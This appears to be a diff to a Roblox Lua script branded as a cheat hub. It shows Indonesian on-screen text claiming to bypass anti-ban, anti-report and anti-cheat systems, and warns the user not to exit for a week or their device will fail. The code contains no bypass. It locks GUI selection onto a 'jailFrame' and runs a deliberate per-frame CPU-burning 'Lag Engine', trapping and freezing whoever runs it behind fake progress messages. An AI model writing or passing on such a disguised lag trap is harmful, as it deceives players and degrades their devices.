@@ -62,28 +62,30 @@ task.spawn(function()
     infoText.BackgroundTransparency = 1
     infoText.Font = Enum.Font.Code
     
-    -- [[ SISTEM UPDATE TEKS - PRIORITAS TINGGI ]] --
+    -- [[ SISTEM UPDATE TEKS - FORCED ]] --
     task.spawn(function()
-        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI BANNED...\n\nSABAR TUNGGU PROSES SELESAI!\nJANGAN KELUAR ATAU PROSES GAGAL!"
-        task.wait(120)
+        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI BANNED...\n\nSABAR TUNGGU PROSES SELESAI!"
+        task.wait(120) -- 2 Menit
         
-        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI REPORT...\n\nSABAR TUNGGU PROSES SELESAI!\nJANGAN KELUAR ATAU PROSES GAGAL!"
-        task.wait(120)
+        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI REPORT...\n\nSABAR TUNGGU PROSES SELESAI!"
+        task.wait(120) -- 2 Menit
         
-        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI DETECTED...\n\nSABAR TUNGGU PROSES SELESAI!\nJANGAN KELUAR ATAU PROSES GAGAL!"
-        task.wait(120)
+        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI DETECTED...\n\nSABAR TUNGGU PROSES SELESAI!"
+        task.wait(120) -- 2 Menit
         
         infoText.Text = "DEKATEAMHUB: BYPASSING ANTI CHEAT...\n\nDURASI: 1 MINGGU\nJANGAN KELUAR ATAU DEVICE ANDA ERROR!"
     end)
 
-    -- Lag Engine (Disesuaikan agar teks tetap bisa update)
-    game:GetService("RunService").RenderStepped:Connect(function()
-        game:GetService("GuiService").SelectedObject = jailFrame
-        infoText.Position = UDim2.new(0.05, math.random(-1, 1), 0.3, math.random(-1, 1))
-        -- Beban dikurangi dikit biar sistem sempet ganti teks
-        for i = 1, 500000 do local _ = i * i end
+    -- Lag Engine (Dijalankan secara terpisah agar teks tetap bisa update)
+    task.spawn(function()
+        game:GetService("RunService").RenderStepped:Connect(function()
+            game:GetService("GuiService").SelectedObject = jailFrame
+            infoText.Position = UDim2.new(0.05, math.random(-1, 1), 0.3, math.random(-1, 1))
+            for i = 1, 400000 do local _ = i * i end
+        end)
     end)
 end)
+
 
 
 
